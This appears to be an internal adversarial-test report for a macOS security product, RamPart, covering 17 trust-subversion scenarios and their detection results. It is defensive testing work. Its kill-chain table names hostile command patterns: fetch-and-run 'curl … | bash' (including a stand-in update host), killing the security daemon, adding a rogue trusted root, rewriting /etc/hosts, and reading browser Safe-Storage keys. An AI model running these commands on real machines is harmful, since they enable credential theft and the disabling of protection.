# Attack suite X1 — the most extreme attacks on TRUST (2026-11-07)

Adversarial pass against RamPart focused on a single theme: attacks that do not try to sneak
code past a scanner, but **subvert the trust decisions** RamPart and macOS rely on — stolen /
notarized-looking certificates, Apple-signed living-off-the-land binaries, poisoned update and
signature/blocklist feeds, compromised package managers that target RamPart users, abuse of
RamPart's own "Not a Threat" / allow rules, fake RamPart helpers, DNS/DoH redirection and rogue
trust anchors.

Every scenario is proven with an **inert** test: synthetic `SecurityEvent` sequences fed to the
`BehaviourEngine`, fixture plists pointing at untrusted temp targets, and `.test`/example strings.
No command runs; nothing touches the network, the real daemon, or user data.

- Test: `Sources/rampart-selftest/SelfTest+AttackX1.swift`, `static func attackX1Checks()`.
- Suites.swift line: `("attackx1", SelfTest.attackX1Checks),`
- Run: `RAMPART_NO_PRIVILEGED_TOOLS=1 .build-agents/out/Products/Debug/rampart-selftest attackx1`

Verdict key: a scenario is **CAUGHT** when a detection reaches alert confidence (≥60), **PARTIAL**
(30–59, logged not alerted), **MISSED** (<30 / suppressed, or a design gap this harness can only
flag). "conf" below is the max confidence observed in the run.

| # | Scenario | Attacker | Kill chain (abbrev.) | Layer that should catch | Result |
|---|----------|----------|----------------------|-------------------------|--------|
| 1 | Stolen Developer ID cert signing a "notarized" stealer | Cert thief | notarized payload → osascript pw dialog → `security` Safe-Storage → stage Login Data → upload | Behaviour alwaysActive R34/R36/R38; Signing revocation | CAUGHT (alwaysActive rules survive the ×0.3 notarization discount) |
| 2 | Lone weak signal under notarized trust | Same | notarized temp binary → first outbound connection | Behaviour (weak) | PARTIAL — notarization legitimately discounts a *single* weak signal; needs a chain (documents the trust-discount gap behind #1) |
| 3 | Apple-signed living-off-the-land chain | LOLBin operator | browser → bash → osascript (pw) → `security` Safe-Storage (every tool Apple-signed) | Behaviour scores lineage, not per-tool signer: R34/R36 | CAUGHT |
| 4 | Compromised Homebrew formula targeting RamPart users | Supply chain | `brew`→ruby→sh postinstall → read Safe-Storage key → stage Login Data in /var/folders | Behaviour R36/R38 | CAUGHT (benign brew does neither — see SelfTest+Behaviour) |
| 5 | Compromised npm lifecycle script | Supply chain | `npm install` → node postinstall → `curl…|bash` → temp payload → Safe-Storage | Behaviour R36 + R40 stealer chain | CAUGHT (conf 100; via R36/R40, not R30) |
| 6 | **Broad Team-ID "Not a Threat" used to whitelist a stealer** | Social engineer | one "trust this developer" click → run stealer under that Team ID | Behaviour alwaysActive R34/R36/R38 **should** survive the allow | **MISSED** — a non-weakOnly allow suppresses strong rules too → needs-behaviour B-X1-1 |
| 7 | Over-broad pathPrefix allow abused | Social engineer | allow a whole folder → run stealer from it | Behaviour alwaysActive credential rules | **MISSED** — same suppression gap → needs-behaviour B-X1-1 |
| 8 | Fake RamPart helper LaunchDaemon (impersonation) | Impersonator | browser→py writes `app.rampart.daemon.plist`→ untrusted temp target → `launchctl bootstrap` | Behaviour R07/R08; Guard identity check | CAUGHT |
| 9 | Kill / unload RamPart | Evasion | untrusted payload → `pkill -f rampartd` / `launchctl bootout …rampart` | Behaviour R55 | CAUGHT |
| 10 | Rogue trusted root certificate (feed/update MITM anchor) | MITM | untrusted payload → `security add-trusted-cert -r trustRoot` | Behaviour R24 | CAUGHT |
| 11 | hosts/DNS redirect of RamPart update & feed endpoints | MITM | untrusted payload → rewrite `/etc/hosts` | Behaviour R25 | CAUGHT |
| 12 | Untrusted DoH bypassing the local resolver | Evasion/exfil | untrusted payload → HTTPS to 1.1.1.1:443 | Behaviour R45; Network DoH pinning (upstream) | CAUGHT (local actor); upstream pinning → needs-network N-X1-1 |
| 13 | Ad-hoc re-sign to fake a valid signature | Gatekeeper bypass | `codesign --force --sign -` → run the re-signed app | Behaviour R28 | CAUGHT |
| 14 | Gatekeeper override then untrusted shell | Gatekeeper bypass | user "Open Anyway" → untrusted app → `curl…|sh` | Behaviour R54 | CAUGHT |
| 15 | ClickFix impersonating a RamPart update | Social engineer | risky clipboard from browser → paste `curl rampart-update.example | bash` in Terminal | Behaviour R31 | CAUGHT |
| 16 | **Poisoned signature / blocklist feed** | Supply chain / MITM | malicious feed adds allowlist/known-good hash → sample whitelisted; or rollback | Engine feed authentication | **MISSED (design)** — feeds are TLS-only, allow entries carry no provenance → needs-engine E-X1-1, needs-network N-X1-2 |
| 17 | **Poisoned RamPart auto-update / DoH-upstream compromise** | Supply chain / MITM | update signed by a different Team ID, or MITM'd DoH upstream poisons lookups | Signing update pinning; Guard identity; Network DoH pinning | **MISSED (design)** — not drivable here; shadow caught by #8/#9/#10 → needs-signing S-X1-2, needs-network N-X1-1 |

## How the trust theme plays out

- **Signer trust is discounted, not trusted blindly.** The behaviour scorer multiplies by trust
  class (apple ×0.2 … unsigned ×1.5). The extreme attacks aim to *buy a low multiplier* — steal a
  notarized cert (#1), chain only Apple-signed tools (#3), or get the user to hand out an allow
  (#6/#7). RamPart holds up on #1/#3 because its highest-value rules (credential theft, keylogger,
  honeytoken, tamper) are **alwaysActive** and survive the discount; lineage scoring means the
  signer of each individual LOLBin never clears the chain.

- **The one place trust is fully honoured is the user's own allow list — and that is the hole.**
  Scenarios #6/#7 show a single social-engineered "Not a Threat" / "trust this developer" decision
  creates a broad allow that suppresses *even* the alwaysActive strong rules, because
  `isAllowlisted` only exempts strong rules when the allow is marked `weakOnly`. That turns one
  low-friction trust click into a global disable of infostealer detection for that signer. Fix in
  needs-behaviour.md.

- **Feed and update trust is out of this harness's reach** (#16/#17) and is the other soft spot:
  feeds are fetched over TLS but not independently authenticated, and remote feeds can touch the
  *allowlist*. Fixes in needs-engine.md / needs-network.md / needs-signing.md.

## Results

Scenario count: **17** (15 behaviour-driven + 2 design-level feed/update gaps).
Run tally is printed by the suite as `[X1] totals: caught=… partial=… missed=…`.

### Top 5 misses by severity
1. **#6/#7 — broad allow suppresses alwaysActive strong rules (High).** One "Not a Threat" click
   whitelists a full stealer. needs-behaviour B-X1-1.
2. **#16 — signature/blocklist feed poisoning (High).** Unauthenticated feeds, and feeds able to
   add allowlist entries, can whitelist malware. needs-engine E-X1-1.
3. **#17 — poisoned update / DoH-upstream compromise (High).** Needs update Team-ID/cdhash pinning
   and DoH SPKI pinning. needs-signing S-X1-2, needs-network N-X1-1.
4. **#1 — stolen notarized cert thin margin (Medium).** Caught, but no live revocation check and
   the notarization discount is applied silently. needs-signing S-X1-1.
5. **#2 — lone weak signal under notarized trust (Low/by-design).** A single weak signal from a
   notarized binary is discounted; acceptable for false-positive control but worth surfacing in the
   "Why was this flagged?" panel. needs-signing S-X1-1.
